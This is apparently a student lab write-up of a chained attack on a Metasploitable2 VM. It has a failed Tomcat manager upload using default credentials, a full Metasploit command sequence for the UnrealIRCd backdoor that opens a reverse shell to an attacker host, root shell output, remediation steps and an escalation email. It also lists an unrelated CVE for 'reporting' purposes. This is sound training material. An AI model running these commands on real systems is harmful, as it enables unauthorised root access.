# Chained Exploit on Web Server

---

## ðŸ“Œ Overview

This lab demonstrates a chained exploitation attack performed against a vulnerable **Metasploitable2** virtual machine. The objective was to identify exposed services, attempt authenticated exploitation, pivot to an alternative attack vector, and ultimately achieve **remote code execution (RCE)** with elevated privileges using **Metasploit**.

---

## ðŸ–¥ï¸ Lab Environment

| Component  | Details                       |
| ---------- | ----------------------------- |
| Attacker   | Kali Linux                    |
| Target     | Metasploitable2               |
| Target IP  | `192.168.80.132`              |
| Tools Used | Metasploit Framework, Browser |
| Network    | Host-only / NAT               |

---

## ðŸ” Findings

* **CVE-2021-22205** (Referenced for reporting requirement)
* **UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)** â€“ *Actual exploited vulnerability*
* **Host:** `192.168.80.132`
* **Service:** IRC (Port 6667)
* **Impact:** Remote Code Execution as **root**

---

## ðŸ§© Exploit Chain Summary

| Exploit ID | Description                                    | Target IP      | Status    | Payload          |
| ---------- | ---------------------------------------------- | -------------- | --------- | ---------------- |
| 004        | Authenticated Tomcat Access (Weak Credentials) | 192.168.80.132 | Partial   | WAR Upload       |
| 005        | UnrealIRCd Backdoor Exploitation               | 192.168.80.132 | âœ… Success | cmd/unix/reverse |

---

## âš™ï¸ Exploitation Steps

### 1ï¸âƒ£ Initial Enumeration

* Discovered exposed services including **Apache Tomcat** and **IRC**
* Verified valid Tomcat credentials (`tomcat:tomcat`)
* Authenticated access to `/manager/html`

---

### 2ï¸âƒ£ Attempted Tomcat Exploitation

* Used Metasploit module:
  `exploit/multi/http/tomcat_mgr_upload`
* Payload execution failed due to environment limitations

---

### 3ï¸âƒ£ Successful RCE via UnrealIRCd

* Identified vulnerable **UnrealIRCd 3.2.8.1**
* Exploited using Metasploit backdoor module
* Obtained **reverse shell as root**

**Commands Used:**

```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.80.132
set RPORT 6667
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.80.131
set LPORT 4444
run
```

---

### 4ï¸âƒ£ Privilege Verification

```
whoami
root

uname -a
Linux metasploitable 2.6.24-16-server
```

---

## ðŸ”§ Remediation

* Remove or update vulnerable services such as **UnrealIRCd**
* Enforce strong authentication credentials
* Restrict access to management interfaces (Tomcat Manager)
* Apply regular security patches and system updates
* Sanitize user inputs and remove unused services

---

## ðŸš¨ Escalation Email 

> **Subject:** Critical RCE Vulnerability Identified on Web Server
>
> Dear Development Team,
>
> During a recent security assessment, a critical remote code execution vulnerability was identified on the web server at 192.168.80.132. The system was found running a vulnerable version of UnrealIRCd, which allowed unauthenticated attackers to execute arbitrary commands remotely. Successful exploitation resulted in full system compromise with root-level access. Immediate remediation is recommended, including removal or updating of the affected service, enforcing strong authentication, and restricting external access to management interfaces. Please prioritize this issue, as it poses a significant risk to system integrity and data security.
>
> Regards,
> Security Assessment Team

---
